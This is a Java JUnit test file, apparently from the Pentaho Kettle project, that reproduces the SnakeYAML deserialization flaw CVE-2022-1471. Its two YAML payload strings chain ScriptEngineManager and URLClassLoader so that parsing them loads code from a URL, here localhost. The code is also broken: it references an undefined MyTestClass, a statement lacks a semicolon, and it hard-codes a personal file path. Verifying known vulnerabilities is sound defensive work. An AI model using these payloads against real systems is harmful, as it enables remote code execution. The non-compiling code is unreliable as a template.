package org.pentaho.di.snakeyaml;

import org.junit.Test;
import org.yaml.snakeyaml.LoaderOptions;
import org.yaml.snakeyaml.Yaml;
import org.yaml.snakeyaml.constructor.Constructor;
import org.yaml.snakeyaml.inspector.TagInspector;

import java.io.ByteArrayInputStream;
import java.io.FileInputStream;
import java.io.InputStream;
import java.util.Map;

/**
 * based off: https://www.veracode.com/blog/research/resolving-cve-2022-1471-snakeyaml-20-release-0
 */
public class PocSnakeYamlCveTest {

  final String attackVecctor = "some_var: !!javax.script.ScriptEngineManager [  \n"
    + "     !!java.net.URLClassLoader [[  \n"
    + "          !!java.net.URL [\"http://localhost:8080/\"]  \n"
    + "     ]]  \n"
    + "] ";

  final String attackVecctor2 = "!!MyTestClass\n"
    + "stringField: \"hi\"\n"
    + "objectField: !!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL [\"http://localhost:8000/\"]]]]";

  final String absolutePathAttackVector = "/Users/njordan/code_sandbox/pentaho/repo/pentaho-kettle/engine/src/test/java/org/pentaho/di/snakeyaml/exploit.yaml";
  public static class Test1 {
    public String some_var = "abc";
  }
  public static class MySerialClass {
    private long id;
    public Object objectField;
    public String stringField;

    public  MySerialClass() {
    }

    public MySerialClass(long id, Object test) {
      this.id = id;
      this.objectField = test;
      this.stringField = test.toString();
    }

    public String toString() {
      return id + " " + stringField.toString();
    }
  }

  @Test
  public void exploit_cve_2022_1471_Test() throws Exception {
    System.out.println("Start parsing...");
    InputStream is = new ByteArrayInputStream( attackVecctor2.getBytes() );
//    InputStream is = new FileInputStream(absolutePathAttackVector);
//    Yaml yaml = new Yaml( new Constructor( MySerialClass.class ) ); // for snakeyaml v1.33 and below
    Yaml yaml = new Yaml( new Constructor( MyTestClass.class, new LoaderOptions() ) ); // for snakeyaml v2.0+
    yaml.load( is ); // not caring about result
    org.yaml.snakeyaml.inspector.TagInspector taginspector =
      tag -> tag.getClassName().equals(MyTestClass.class.getName())
    System.out.println("End parsing.");
  }
}
